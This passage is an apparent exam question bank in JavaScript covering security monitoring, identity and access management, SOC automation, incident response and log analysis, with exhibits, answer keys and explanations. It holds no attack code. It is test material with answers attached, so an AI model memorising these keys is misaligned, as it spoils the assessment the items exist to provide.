    explanation: "A **responsible (vulnerability) disclosure policy** tells researchers what is in scope, promises safe harbor for good-faith testing and sets response expectations; RFC 9116 `security.txt` (with mandatory Contact and Expires fields) tells them where to report. A **bounty program** adds payments, which Contoso does not offer. An NDA before reporting deters reports. A penetration test SOW governs a hired tester, not outside researchers." },

  // ---------- 4.4 ----------
  { topic: '4.4', type: 'fill', difficulty: 2, lesson: L44B,
    stem: "Refer to the exhibit. Enter the numeric syslog severity of this message.",
    exhibit: `Received on syslog01 (UDP 514):
<187>1 2026-11-21T03:14:07.512Z fw01.example.com fwd - - - interface port3 link down`,
    answer: ['3'],
    explanation: "RFC 5424: **PRI = facility x 8 + severity**. 187 / 8 = 23 remainder **3**, so facility 23 (**local7**) and severity **3 (Error)**. The `1` after the bracket is the syslog protocol version. Severities run from 0 (Emergency) to 7 (Debug); lower is more severe." },
  { topic: '4.4', type: 'single', difficulty: 2, lesson: L44B,
    stem: "Refer to the exhibit. Which statement describes this SNMP configuration?",
    exhibit: `sw-core(config)# snmp-server view NMS-VIEW iso included
sw-core(config)# snmp-server group NMS-RO v3 priv read NMS-VIEW access 99
sw-core(config)# snmp-server user nms01 NMS-RO v3 auth sha <auth-secret> priv aes 128 <priv-secret>
sw-core(config)# access-list 99 permit host 10.10.99.5`,
    options: ["SNMPv3 at noAuthNoPriv: the user name is checked but nothing is authenticated or encrypted", "SNMPv3 at authPriv: messages are authenticated with SHA and encrypted with AES, the user has read-only access, and only 10.10.99.5 may poll", "SNMPv2c with a community string sent in cleartext", "SNMPv3 that allows nms01 to change the configuration with Set requests"],
    answer: [1],
    explanation: "`v3 priv` is the **authPriv** security level (RFC 3411): USM authentication (`auth sha`) plus privacy/encryption (`priv aes 128`). The group grants only a **read** view, and `access 99` restricts which source may use it to 10.10.99.5. noAuthNoPriv would use `noauth`. There is no community string, so it is not v1/v2c. No write view is configured, so Set requests are not allowed." },
  { topic: '4.4', type: 'fill', difficulty: 1, lesson: L44B,
    stem: "An NMS must receive SNMP traps from 200 switches. Enter the UDP port the NMS must listen on (standard, non-TLS).",
    answer: ['162', 'udp 162', 'udp/162'],
    explanation: "IANA assigns **UDP 162** (snmptrap) for traps and informs sent to the manager. The agent on each device listens on UDP 161 for Get and Set requests. SNMP over TLS/DTLS (RFC 6353) uses 10161 and 10162." },
  { topic: '4.4', type: 'single', difficulty: 2, lesson: L44B,
    stem: "Refer to the exhibit. 10.10.20.15 is ws01. Which conclusion do these records alone support?",
    exhibit: `IPFIX records exported by fw01, 2026-11-21
Start     End       Src IP:Port          Dst IP:Port          Proto  Packets     Bytes
02:10:04  02:54:51  10.10.20.15:49822    203.0.113.77:443     TCP    3,102,447   4,318,220,114
02:10:04  02:54:51  203.0.113.77:443     10.10.20.15:49822    TCP    1,544,902      81,903,551`,
    options: ["The transfer contained customer records", "ws01 sent about 4.3 GB to 203.0.113.77 on TCP 443 in about 45 minutes, far more than it received", "The session was encrypted with TLS 1.3", "alice was the user logged on to ws01 during the transfer"],
    answer: [1],
    explanation: "Flow records are unidirectional metadata: addresses, ports, protocol, packet and byte counts, times. Here there is one record per direction, showing **about 4.3 GB out** and about 82 MB back over roughly 45 minutes, a pattern worth investigating as possible exfiltration. Flows contain **no payload**, so they cannot show what the data was or which TLS version was used (port 443 does not prove TLS). They also do not identify the logged-on user; that needs authentication or endpoint logs." },
  { topic: '4.4', type: 'single', difficulty: 2, lesson: L44A,
    stem: "The SOC wants to see the exact HTTP requests and file contents that a suspicious host on VLAN 20 sends during the next 24 hours. Which approach provides this?",
    options: ["Enable NetFlow export on the VLAN 20 gateway", "Lower the host's syslog logging level to debug", "Poll the host's switch port interface counters with SNMP", "Mirror the host's switch port to a sensor and capture packets with a packet analyzer"],
    answer: [3],
    explanation: "Only **packet capture** records full packets, including HTTP requests and transferred content (when unencrypted). **Port mirroring** (SPAN) or a TAP delivers a copy to the capture device. NetFlow gives metadata without payload; syslog gives events the host chooses to log; SNMP interface counters give byte and packet totals only." },
  { topic: '4.4', type: 'multi', difficulty: 2, lesson: L44B,
    stem: "Contoso wants a scanner to evaluate 500 Linux servers each night against a published hardening benchmark, in standard content any SCAP-validated tool can read. Which two SCAP components define the checklist rules and the technical tests that check them? (Choose two.)",
    options: ["CVSS", "XCCDF", "CPE", "OVAL", "TMSAD", "ARF"],
    answer: [1, 3],
    explanation: "In SP 800-126 Rev. 3, **XCCDF** is the checklist language (the benchmark, its rules and profiles) and **OVAL** is the language for the technical tests the rules reference. CVSS scores vulnerability severity; CPE names platforms; TMSAD is the integrity (signing) specification; ARF is the format for reporting results, not for defining rules or tests." },
  { topic: '4.4', type: 'single', difficulty: 2, lesson: L44A,
    stem: "Refer to the exhibit. What is the best tuning action?",
    exhibit: `SIEM rule "Mass file read": alert when one account reads more than 5,000 files in 10 minutes
Alerts, last 30 days: 31
  30 x  svc-backup on srv-bkp01, between 01:00 and 01:40 (nightly scheduled backup)
   1 x  bob on ws07, 2026-11-19 14:22`,
    options: ["Disable the rule, because 97 % of its alerts are false positives", "Add an exception for svc-backup on srv-bkp01 during its backup window, keep the rule for everything else and review the exception periodically", "Raise the threshold to 500,000 files for all accounts", "Exclude all service accounts from the rule"],
    answer: [1],
    explanation: "The noise comes from one known, legitimate job, so the right fix is a **narrow exception** (one account, one host, one time window) with an owner and review date. The remaining alert on bob is exactly what the rule exists to find. Disabling the rule or raising the threshold so high would create **false negatives**. Excluding every service account creates a blind spot attackers can use, since compromised service accounts are common." },
  { topic: '4.4', type: 'match', difficulty: 2, lesson: L44A,
    stem: "Match each monitoring need with the tool that meets it.",
    pairs: [
      ["Correlate firewall, VPN and domain controller logs to alert on a VPN logon followed by mass file access", "SIEM"],
      ["Decode the full packets of one suspicious session to read its HTTP headers", "Packet analyzer"],
      ["Compare 200 servers' settings with a published secure-configuration standard", "Benchmarks"],
      ["Graph switch interface utilization over SNMP and alert when a core link goes down", "Network management system (NMS)"],
      ["Automatically enrich a phishing alert, purge the message and open a ticket", "Orchestration (SOAR)"],
      ["Block an upload of files containing card numbers to personal cloud storage", "DLP"],
    ],
    explanation: "A **SIEM** aggregates and correlates logs across sources. A **packet analyzer** decodes captured packets. **Benchmarks** (CIS, STIG) are the standard a compliance scan checks against. An **NMS** polls and receives SNMP, syslog and flows for availability and performance. **Orchestration** runs playbooks across tools. **DLP** detects and blocks sensitive data leaving." },

  // ---------- 4.5 ----------
  { topic: '4.5', type: 'order', difficulty: 2, lesson: L45A,
    stem: "Put the steps of SP-initiated SAML 2.0 web single sign-on in order.",
    items: [
      "The user requests a page at the service provider without an existing session",
      "The SP redirects the browser to the IdP's single sign-on service with a SAML AuthnRequest",
      "The IdP authenticates the user, for example with a password and MFA",
      "The IdP returns a signed SAML Response containing the assertion, which the browser posts to the SP's assertion consumer service",
      "The SP validates the signature, audience and validity period, creates a session and serves the page",
    ],
    explanation: "This is the flow in the OASIS SAML 2.0 technical overview: the SP sends an `<AuthnRequest>` through a browser redirect, the IdP authenticates the user (or reuses its session), then builds and **digitally signs** an assertion inside a `<Response>`, which the browser POSTs to the SP's assertion consumer service. The SP trusts it because it can verify the IdP's signature with the certificate exchanged in federation metadata." },
  { topic: '4.5', type: 'single', difficulty: 3, lesson: L45A,
    stem: "Refer to the exhibit. Which statement about this exchange is correct?",
    exhibit: `1. Browser -> GET https://auth.example.com/authorize?response_type=code&client_id=planner-app
      &redirect_uri=https://planner.example.net/cb&scope=calendar.read&state=k39f2a
      &code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM&code_challenge_method=S256
2. alice signs in at auth.example.com and approves "Planner wants to read your calendar"
3. 302 -> https://planner.example.net/cb?code=example-auth-code&state=k39f2a
4. Planner -> POST https://auth.example.com/token  (code, code_verifier, client credentials)
   <- {"access_token":"example-access-token-not-real","token_type":"Bearer","expires_in":3600,"scope":"calendar.read"}
5. Planner -> GET https://api.example.com/v1/calendar   Authorization: Bearer example-access-token-not-real`,
    options: ["It is SAML SSO; the access token is a signed XML assertion about alice", "Planner receives alice's password in step 4 and uses it to call the API", "It is an OAuth 2.0 authorization code grant with PKCE; the token lets Planner read alice's calendar but is not an identity assertion Planner should use to log her in", "Because alice authenticated in step 2, the access token gives Planner full access to her account"],
    answer: [2],
    explanation: "`response_type=code`, the `code_challenge`/`code_verifier` pair and the token endpoint show the **OAuth 2.0 authorization code grant with PKCE** (RFC 6749, RFC 7636; recommended by RFC 9700). OAuth is **authorization**: the access token grants the client the requested **scope** (`calendar.read`) at the resource server. It is not an authentication statement for the client; that is what OpenID Connect's ID token (request scope `openid`) adds. Planner never sees alice's password; she types it only at the authorization server. The token is limited to its scope. Nothing here is XML or SAML." },
  { topic: '4.5', type: 'match', difficulty: 2, lesson: L45A,
    stem: "Match each account with its account type.",
    pairs: [
      ["alice's everyday account for email and documents", "User account"],
      ["A member of Domain Admins who can change any server in the forest", "Privileged account (global)"],
      ["The Administrator account on ws01, with a unique password managed by Windows LAPS", "Privileged account (local)"],
      ["The identity the backup software runs as, denied interactive logon", "Service account"],
      ["An account for the HVAC vendor's technician, sponsored by facilities and expiring after 30 days", "Third-party account"],
      ["A cloud administrator account with a vaulted credential, used only if the normal sign-in path or MFA service fails", "Emergency access account"],
    ],
    explanation: "A **user** account serves one person's daily work. **Global** privileged accounts administer the whole domain or tenant; **local** privileged accounts administer one machine (LAPS gives each a unique password). **Service** accounts run software, not people. **Third-party** accounts belong to vendors or contractors and need a sponsor and expiry. **Emergency access** (break-glass) accounts exist for when normal administration fails; their use should always raise an alert." },
  { topic: '4.5', type: 'multi', difficulty: 2, lesson: L45A,
    stem: "Contoso's administrators were phished through an adversary-in-the-middle proxy that relayed their passwords and their second-factor responses to the real login page. Which two MFA methods would resist this attack? (Choose two.)",
    options: ["TOTP codes from an authenticator app", "FIDO2 security keys using WebAuthn", "SMS one-time passwords", "Push notifications with number matching", "PIV smart cards using certificate-based authentication", "Printed backup codes"],
    answer: [1, 4],
    explanation: "SP 800-63B-4 says authenticators that rely on manual entry of an output (OTP and out-of-band codes) **SHALL NOT** be considered phishing-resistant, because a proxy can relay the code. Phishing resistance needs cryptographic authentication bound to the real verifier: **WebAuthn/FIDO2** binds the credential to the site's domain (verifier name binding) and **PIV/CAC smart cards** with client-authenticated TLS use channel binding. TOTP, SMS and backup codes are typed and relayable; number matching makes push approvals harder to trick but an AiTM proxy can still display the number to the victim." },
  { topic: '4.5', type: 'match', difficulty: 1, lesson: L45A,
    stem: "Match each authentication method with the MFA term it represents.",
    pairs: [
      ["A USB security key the user touches to sign in", "Hard token"],
      ["An authenticator app on bob's phone that approves sign-in prompts", "Soft token"],
      ["A fingerprint reader on the laptop unlocks the user's credential", "Biometrics"],
      ["A six-digit code sent by text message that is valid for one sign-in", "One-time password (OTP)"],
      ["One of ten single-use codes printed at enrollment, for when the phone is lost", "Backup code"],
    ],
    explanation: "A **hard token** is a physical device; a **soft token** is software on a phone or computer. **Biometrics** are something you are (SP 800-63B-4 allows them only together with a physical authenticator). A code valid for one use is an **OTP** (here delivered by SMS, which NIST treats as a restricted authenticator). **Backup codes** are pre-generated single-use codes (NIST look-up secrets) for recovery." },
  { topic: '4.5', type: 'match', difficulty: 2, lesson: L45B,
    stem: "Match each scenario with the access control model it illustrates.",
    pairs: [
      ["bob shares a folder he created with alice and chooses read-only access for her", "Discretionary"],
      ["Documents labeled Secret open only for users cleared to Secret, and owners cannot change the labels", "Mandatory"],
      ["Everyone assigned the Payroll Clerk role gets the payroll application and share", "Role-based"],
      ["The VPN denies every connection from outside three approved countries, whoever the user is", "Rule-based"],
      ["Contractors can sign in only Monday to Friday, 07:00 to 19:00", "Time-based"],
      ["An administrator receives Domain Admin for two hours after approval, then loses it automatically", "Just-in-time"],
    ],
    explanation: "**DAC**: the owner decides (NIST). **MAC**: a central authority sets labels and clearances that users cannot change. **Role-based**: permissions attach to job roles. **Rule-based**: the same rule applies to every request regardless of role. **Time-based**: access only in defined windows. **Just-in-time**: privilege granted on request for a limited period, with no standing access." },
  { topic: '4.5', type: 'single', difficulty: 2, lesson: L45A,
    stem: "Refer to the exhibit. What failure does this show, and what is the immediate action?",
    exhibit: `HR system:  bob (EMP-2207)  status: Terminated  effective 2026-10-31
Directory:  bob  enabled=True  lastLogon=2026-11-19 22:47
            memberOf: VPN-Users, Finance-Share-RW
VPN log:    2026-11-19 22:41  user=bob  src=198.51.100.140  result=success`,
    options: ["A provisioning failure; add bob to the groups his replacement needs", "An identity proofing failure; re-verify bob's identity documents", "A deprovisioning failure; disable bob's account and revoke his sessions, review what was accessed since 2026-10-31, and tie account disablement to the HR termination event", "A successful access review; no action is needed because bob's groups match his old job"],
    answer: [2],
    explanation: "A terminated employee's account stayed enabled and was used three weeks later: a **deprovisioning** failure. Disable it and revoke sessions now, investigate the post-termination activity (VPN and finance share access), and fix the process by automating disablement from the HR system of record. Provisioning adds access, which is the opposite of what is needed. Identity proofing happens at enrollment. Matching an ex-employee's old job is not a reason to keep access." },
  { topic: '4.5', type: 'single', difficulty: 2, lesson: L45B,
    stem: "Refer to the exhibit. What should the reviewer do?",
    exhibit: `Quarterly access review - alice (current role: Marketing Analyst since 2026-03)
Group                Granted    Granted for role
Marketing-Share-RW   2026-03    Marketing Analyst
CRM-ReadOnly         2026-03    Marketing Analyst
Finance-AP-App       2024-06    AP Clerk (previous role)
Payroll-Reports      2025-01    Payroll Analyst (previous role)`,
    options: ["Approve all groups, because alice is still employed", "Revoke all of alice's access and have her request it again", "Move alice's access to a privileged account", "Revoke Finance-AP-App and Payroll-Reports, which are left over from previous roles, and approve the marketing access"],
    answer: [3],
    explanation: "Access kept from earlier roles is **privilege creep**, which access reviews exist to catch; it also breaks separation of duties (payables plus payroll). Revoke what the current role does not need and keep what it does. Employment alone does not justify access. Revoking everything disrupts legitimate work for no benefit. Moving access to a privileged account increases risk." },
  { topic: '4.5', type: 'single', difficulty: 2, lesson: L45B,
    stem: "Refer to the exhibit. Passwords are the only factor for this internal portal. Which set of changes aligns the policy with NIST SP 800-63B-4?",
    exhibit: `Portal password policy (current)
Minimum length:     8
Complexity:         required (3 of 4 character types)
Maximum age:        60 days
Password history:   12
Check against compromised/common password list: No`,
    options: ["Keep 8 characters but require all 4 character types and 30-day expiry", "Require at least 15 characters, remove the composition rule, stop periodic expiry and reject passwords found on a blocklist of compromised and common values", "Require 12 characters and monthly expiry, and add security questions for recovery", "Allow password hints and require a change every 90 days"],
    answer: [1],
    explanation: "SP 800-63B-4: single-factor passwords **SHALL be at least 15 characters**; verifiers **SHALL NOT impose composition rules** or **require periodic changes** (change only on evidence of compromise); they **SHALL check new passwords against a blocklist** of commonly used, expected or compromised values. More composition and shorter expiry go the wrong way. Security questions (KBA) and hints accessible to unauthenticated users are prohibited." },
  { topic: '4.5', type: 'fill', difficulty: 2, lesson: L45B,
    stem: "Refer to the exhibit. Which setting must be changed to stop this behavior? Enter its name as shown.",
    exhibit: `Default Domain Policy > Computer Configuration > Windows Settings > Security Settings
  > Account Policies > Password Policy
Enforce password history     24 passwords remembered
Maximum password age         90 days
Minimum password age         0 days
Minimum password length      14 characters

Audit note (last 30 days): 37 users changed their password 25 times within one minute,
ending with the password they had before.`,
    answer: ['Minimum password age', 'minimum age', 'min password age'],
    explanation: "With **Minimum password age** at 0 days, users can change their password 25 times in a row to push the old one out of the 24-entry history and reuse it. Setting a minimum age (for example 1 day) makes that cycling impractical; history and minimum age work together. Longer history alone can still be cycled through, maximum age is what forces the changes in the first place, and length is unrelated." },
  { topic: '4.5', type: 'single', difficulty: 2, lesson: L45B,
    stem: "Contoso wants users to stop typing any secret that a phishing site could capture, and to sign in with the same fingerprint or PIN they use to unlock their phones. Which approach meets both goals?",
    options: ["Passkeys (FIDO credentials) registered for each application", "A password manager with a strong master password", "Longer passwords with complexity rules", "TOTP codes from an authenticator app"],
    answer: [0],
    explanation: "A **passkey** is a per-site FIDO key pair; the user approves sign-in with the device unlock gesture (biometric or PIN), the private key never leaves the authenticator, and WebAuthn binds it to the real domain, so there is nothing for a phishing site to capture. A password manager still uses passwords that a user can paste into a fake site. Longer passwords are still typed secrets. TOTP codes are typed and relayable." },
  { topic: '4.5', type: 'single', difficulty: 2, lesson: L45A,
    stem: "An in-house application authenticates users with an LDAP simple bind to dc01 on TCP 389. A packet capture shows users' passwords in cleartext. Which change fixes this with the least change to the application?",
    options: ["Replace LDAP with SAML federation through a new IdP", "Protect the bind with TLS: LDAPS on TCP 636 or StartTLS on 389", "Switch the application to SNMPv3", "Move the LDAP connection to UDP 389"],
    answer: [1],
    explanation: "An LDAP **simple bind** sends the password as is; wrapping the connection in **TLS** (LDAPS, TCP 636, or StartTLS on 389) encrypts it while the application keeps using LDAP. Re-architecting to SAML might be a good long-term goal but is far more change. SNMP is a management protocol, not authentication. UDP does not add encryption." },
  { topic: '4.5', type: 'single', difficulty: 3, lesson: L45A,
    stem: "A remote new hire uploads a photo of her passport, and then takes a live selfie that the onboarding system compares with the passport photo. In NIST SP 800-63A-4 terms, which identity proofing outcome does the selfie comparison provide?",
    options: ["Identity resolution", "Evidence validation", "Identity verification", "Identity enrollment"],
    answer: [2],
    explanation: "SP 800-63A-4 defines **identity verification** as confirming that the applicant is the genuine owner of the presented evidence: comparing a live face with the passport photo does that. **Evidence validation** confirms the passport itself is genuine and accurate. **Identity resolution** establishes that the claimed identity is one unique person in the population served. **Enrollment** registers the proofed applicant as a subscriber afterward." },

  // ---------- 4.6 ----------
  { topic: '4.6', type: 'match', difficulty: 1, lesson: L46,
    stem: "Match each automation with its use case.",
    pairs: [
      ["A new-hire record in the HR system creates the account, mailbox and role groups automatically", "User provisioning"],
      ["A reviewed template deploys a hardened web server and its firewall rules in the cloud", "Resource provisioning"],
      ["A nightly job finds that a server's SMBv1 setting was re-enabled and reverts it", "Desired state management"],
      ["A job flags an account downloading 40 times its usual volume of files", "Anomaly detection"],
      ["Each critical scanner finding opens a ticket for the asset owner and escalates if it is not closed in 7 days", "Ticket management"],
    ],
    explanation: "Creating accounts and access from HR events is **user provisioning**; deploying infrastructure from templates is **resource provisioning**; detecting and correcting configuration drift is **desired state management**; flagging deviations from normal behavior is **anomaly detection**; creating, routing and escalating work items is **ticket management**." },
  { topic: '4.6', type: 'order', difficulty: 2, lesson: L46,
    stem: "Put the steps of this automated phishing-response playbook in order.",
    items: [
      "Ingest the user-reported email from the phishing mailbox",
      "Extract indicators: sender, URLs and attachment hashes",
      "Enrich the indicators with reputation lookups and a sandbox detonation",
      "Decide: if any indicator is malicious, continue; otherwise close as benign",
      "Purge matching messages from all mailboxes and block the URL and sender",
      "Update the ticket with the evidence and notify the analyst and the reporter",
    ],
    explanation: "A playbook needs input before it can extract indicators, indicators before enrichment, enrichment before an informed decision, and a decision before any containment action. Containment (purge and block) happens only on a malicious verdict, which is the **automation logic** guardrail against acting on clean mail. Documentation and notification close the loop with the evidence gathered at each step." },
  { topic: '4.6', type: 'multi', difficulty: 2, lesson: L46,
    stem: "Refer to the exhibit. Which two guardrails would have prevented this outage while keeping automated blocking of other sources running at all hours? (Choose two.)",
    exhibit: `Post-incident review: playbook "Auto-block on IPS critical"
03:12  IPS critical signature from 192.0.2.10 (partner EDI gateway)
03:12  Playbook added 192.0.2.10 to the fw01 block list (no approval step)
03:12-07:40  Partner order feed down; 4,100 orders delayed
Root cause: false-positive signature on the partner's file format`,
    options: ["A protected list of critical partner and infrastructure addresses that the playbook may never block automatically", "Disable the playbook and block every source manually from now on", "Lower the IPS signature's severity to informational for all traffic", "Require analyst approval before blocking any address tagged as business-critical", "Run the playbook only during business hours", "Block the partner's whole subnet next time to be safe"],
    answer: [0, 3],
    explanation: "**Guardrails** limit what automation may do on its own: a **protected (never-auto-block) list** for critical assets and **human approval** for high-impact actions both stop this outage while letting the playbook keep blocking ordinary attackers. Disabling the playbook gives up the benefit entirely. Downgrading the signature for all traffic hides real attacks. Business-hours-only automation would have skipped this 03:12 block only by leaving every night unprotected, which the stem rules out, and it does not fix the logic. Blocking more of the partner makes the outage worse." },
  { topic: '4.6', type: 'single', difficulty: 2, lesson: L46,
    stem: "Refer to the exhibit. What is this pipeline doing?",
    exhibit: `Pipeline run #812 (branch: main)
stage: build     OK
stage: sast      FAIL  2 high: SQL built by string concatenation (orders/repo.py:88, :131)
stage: sca       OK    0 known-vulnerable dependencies
stage: secrets   OK
stage: sign      SKIPPED
stage: deploy    SKIPPED  (policy gate: no high or critical findings allowed)`,
    options: ["Enforcing a security gate: the static analysis findings stopped the build from being signed and deployed until they are fixed", "Deploying the code, because the secrets stage passed", "Running dynamic testing against production", "Reporting a leaked API key in orders/repo.py"],
    answer: [0],
    explanation: "This is **CI/CD security automation**: the SAST stage found high-severity injection risks, and the **policy gate** stopped signing and deployment. Nothing was deployed (both stages skipped). SAST is static analysis of code, not dynamic testing of a running system. The secrets stage passed; the findings are SQL construction, not a leaked key." },
  { topic: '4.6', type: 'single', difficulty: 2, lesson: L46,
    stem: "Contoso's SOC deploys an AI assistant that, on its own, queries the SIEM and EDR about an alert, decides it needs more evidence, pulls threat intelligence, and then proposes isolating a host for an analyst to approve. Which AI capability does this describe?",
    options: ["Chatbot", "Predictive analysis", "AI-augmented baselines", "Agentic AI"],
    answer: [3],
    explanation: "**Agentic** AI plans and carries out multi-step tasks with tools, deciding its own next steps; the approval step for isolation is a guardrail on its actions. A **chatbot** answers questions in conversation without acting on its own. **Predictive analysis** forecasts likely events from historical data. **AI-augmented baselines** learn normal behavior and flag deviations." },

  // ---------- 4.7 ----------
  { topic: '4.7', type: 'order', difficulty: 2, lesson: L47,
    stem: "Put these ransomware incident activities in the order in which the SY0-801 objectives list incident response activities.",
    items: [
      "Preparation: maintain the ransomware playbook and run a tabletop exercise",
      "Identification: EDR alerts on mass file encryption on srv02",
      "Investigation: capture memory and image srv02 under chain of custody",
      "Containment: isolate srv02 and disable the compromised account",
      "Negotiation: management, legal counsel and the insurer decide how to respond to the ransom demand",
      "Eradication/recovery: remove persistence, rebuild srv02 and restore clean backups",
      "Notification/external reporting: notify the regulator and affected customers as required",
      "Post-incident: hold a lessons-learned meeting and write the post-incident report",
    ],
    explanation: "The objectives list **preparation, identification, investigation, containment, negotiation, eradication/recovery, notification/external reporting, post-incident**. In real incidents these overlap (evidence collection continues during containment, notification clocks may start at identification), but the exam expects this sequence. NIST SP 800-61 Rev. 3 maps the same work onto CSF 2.0 Functions instead of a fixed sequence." },
  { topic: '4.7', type: 'multi', difficulty: 2, lesson: L47,
    stem: "EDR shows ws01 running ransomware that is still encrypting a mapped share. The team wants to stop the spread while keeping the most evidence. Which two actions should come first? (Choose two.)",
    options: ["Hold the power button until ws01 shuts down", "Use EDR network containment to isolate ws01 from everything except the EDR console", "Reimage ws01 from the gold image", "Capture a memory dump of ws01 before any shutdown", "Delete the encrypted files from the share", "Email the ransom note to all staff as a warning"],
    answer: [1, 3],
    explanation: "**EDR isolation** stops ws01 reaching the share and other hosts while leaving it running and reachable for investigation; a **memory dump** preserves volatile evidence (processes, connections, possibly keys) that a shutdown would destroy. Pulling the power loses memory. Reimaging destroys evidence and belongs to eradication. Deleting encrypted files destroys data that might be decrypted later. Circulating the ransom note spreads panic, not protection." },
  { topic: '4.7', type: 'single', difficulty: 2, lesson: L47,
    stem: "Refer to the exhibit. What problem does this evidence log show?",
    exhibit: `Evidence E-07: 1 TB SSD, serial S5XN123456, removed from srv02
Date/time (UTC)    Released by       Received by        Purpose               Seal
2026-11-20 09:14   bob (IR)          Evidence locker    Storage               #44821 intact
2026-11-20 16:02   Evidence locker   alice (forensics)  Imaging               #44821 intact
2026-11-21 13:20   Legal counsel     External lab       Second examination    #44907 intact
2026-11-23 11:05   External lab      Evidence locker    Return                #44907 intact`,
    options: ["Seal numbers must never be recorded in a custody log", "There is no record of the drive passing from alice to legal counsel, a gap in the chain of custody that weakens its admissibility", "Times are recorded in UTC instead of local time", "The drive should have been imaged before it was removed from srv02"],
    answer: [1],
    explanation: "Chain of custody (NIST) documents **every** person who handled the evidence, when, and why. alice received the drive, and the next entry has legal counsel releasing it, so the alice-to-legal transfer (and the change of seal from #44821 to #44907, presumably after imaging) is undocumented. Recording seal numbers and using UTC are good practice. Removing and then imaging a drive with a write blocker is a normal acquisition method." },
  { topic: '4.7', type: 'single', difficulty: 2, lesson: L47,
    stem: "Attackers who encrypted Contoso's servers and stole HR data are demanding payment. Who should decide on and conduct any engagement with the attackers?",
    options: ["The analyst who first saw the ransom note, to save time", "The IT help desk, because it handles external communications", "Senior management with legal counsel, the cyber insurer and a specialist negotiator, with law enforcement informed", "No one: Contoso must pay before the attacker's deadline"],
    answer: [2],
    explanation: "**Negotiation** is a business and legal decision: management decides, with **legal counsel** (including whether a payment could breach sanctions or other law), the **insurer**, often a specialist negotiator, and **law enforcement** informed. Individual analysts or the help desk must not engage informally. Payment is never automatic: backups, legality and the fact that payment does not guarantee deletion of stolen data all weigh in." },
  { topic: '4.7', type: 'single', difficulty: 1, lesson: L47,
    stem: "Contoso, which processes EU residents' personal data, becomes aware on Monday at 09:00 that customer records were exfiltrated, and the breach is likely to put those customers at risk. Under GDPR Article 33, by when should Contoso notify the competent supervisory authority, where feasible?",
    options: ["Within 72 hours of becoming aware, so by Thursday 09:00", "Within 30 days, after the investigation is complete", "Only once law enforcement agrees", "Within 24 hours, by notifying each customer directly instead"],
    answer: [0],
    explanation: "GDPR Article 33 requires notifying the supervisory authority **without undue delay and, where feasible, not later than 72 hours** after becoming aware of a personal data breach, unless it is unlikely to result in a risk to individuals. Information can be provided in phases if the investigation is not finished. Notifying data subjects is a separate obligation (Article 34) and does not replace notifying the authority." },
  { topic: '4.7', type: 'multi', difficulty: 1, lesson: L47,
    stem: "Which two activities belong to the post-incident phase? (Choose two.)",
    options: ["Isolating the infected host", "Root cause analysis", "Restoring servers from backup", "A lessons-learned meeting that updates playbooks and controls", "Searching EDR data for the initial indicator"],
    answer: [1, 3],
    explanation: "Post-incident work is **lessons learned**, **root cause analysis** and the **post-incident report**. Isolation is containment, restoring from backup is recovery, and searching for indicators is identification (detection or threat hunting) and investigation." },
  { topic: '4.7', type: 'fill', difficulty: 2, lesson: L47,
    stem: "Refer to the exhibit. Enter the number of hours between initial access and detection.",
    exhibit: `Incident 2026-031 timeline (UTC)
2026-11-03 22:15  Phishing email delivered to bob
2026-11-03 22:41  bob opens the attachment; implant runs on ws12 (initial access)
2026-11-04 03:10  Implant beacons to 203.0.113.66 every 300 s
2026-11-06 22:41  First SIEM alert: credential dumping detected on ws12
2026-11-06 23:05  ws12 isolated`,
    answer: ['72', '72 hours', '72h'],
    explanation: "Initial access was **2026-11-03 22:41** and detection (the first alert) was **2026-11-06 22:41**: exactly three days, **72 hours**. Email delivery is earlier than initial access, and isolation at 23:05 is containment, 24 minutes after detection. Building this kind of timeline is how the post-incident report measures dwell time and response speed." },
  { topic: '4.7', type: 'match', difficulty: 2, lesson: L47,
    stem: "Match each activity with the incident response concept it represents.",
    pairs: [
      ["Responders talk through a ransomware scenario around a table without touching any system", "Tabletop exercise"],
      ["A vendor bulletin warns of active exploitation of the VPN appliance model Contoso uses", "External advisory"],
      ["With no alert firing, an analyst searches EDR data for scheduled tasks created by unusual accounts", "Threat hunting"],
      ["Counsel instructs IT to suspend automatic deletion for 12 mailboxes because a lawsuit is expected", "Preservation (legal hold)"],
      ["The team collects, reviews and produces mailbox and chat records requested in litigation", "E-discovery"],
    ],
    explanation: "A **tabletop** is a discussion-based preparation exercise. A vendor or government bulletin is an **external advisory** (identification). Hypothesis-driven searching without an alert is **threat hunting**. Suspending deletion because litigation is anticipated is **preservation** under a legal hold. Identifying, collecting and producing electronic records for litigation is **e-discovery**." },

  // ---------- 4.8 ----------
  { topic: '4.8', type: 'fill', difficulty: 2, lesson: L48,
    stem: "Refer to the exhibit. Enter the event ID that records an account being added to the Domain Admins group.",
    exhibit: `Security log, dc01.example.com, 2026-11-21 (fields condensed)
22:40:11  4624  TargetUserName=helpdesk07  LogonType=10  IpAddress=10.10.20.15
22:41:58  4672  SubjectUserName=helpdesk07
22:43:30  4720  SubjectUserName=helpdesk07  TargetUserName=svc-sync2
22:43:52  4728  SubjectUserName=helpdesk07  MemberName=CN=svc-sync2,OU=Service,DC=example,DC=com  TargetUserName=Domain Admins
22:44:10  4732  SubjectUserName=helpdesk07  MemberName=CN=svc-sync2,OU=Service,DC=example,DC=com  TargetUserName=Backup Operators`,
    answer: ['4728'],
    explanation: "Microsoft documents **4728** as \"A member was added to a security-enabled global group\"; Domain Admins is a global group, and the line names it. **4732** is the same action for a security-enabled local group (Backup Operators is a builtin domain local group). 4720 is account creation, 4672 is special privileges assigned at logon, and 4624 is a successful logon (type 10 = remote interactive/RDP). Together they show helpdesk07 creating an account and making it a domain admin within four minutes of an RDP logon." },
  { topic: '4.8', type: 'match', difficulty: 2, lesson: L48,
    stem: "Match each investigation question with the type of log or data that answers it.",
    pairs: [
      ["Was bob's badge used at the server room door at 02:10?", "Physical access log"],
      ["Which internal host looked up update-check.example.net?", "Network log (DNS queries)"],
      ["Did the attacker's sign-in pass MFA?", "Authentication log"],
      ["Which user exported 50,000 records from the CRM?", "Application log"],
      ["What process did the macro launch on ws01?", "Endpoint log (EDR telemetry)"],
      ["Which mail servers relayed the phishing message, according to its Received headers?", "Metadata"],
    ],
    explanation: "Door events are **physical access** (accounting) records. Name lookups are in **network** logs from the DNS resolver. MFA results are in **authentication** logs (IdP sign-in logs). Exports inside an application are in its **application** log. Process creation is **endpoint** telemetry. Received headers are **metadata** about the message, not its content." },
  { topic: '4.8', type: 'order', difficulty: 2, lesson: L48,
    stem: "Order these sources from most to least volatile, following the example order of volatility in RFC 3227.",
    items: [
      "CPU registers and cache",
      "Routing table, ARP cache, process table and memory",
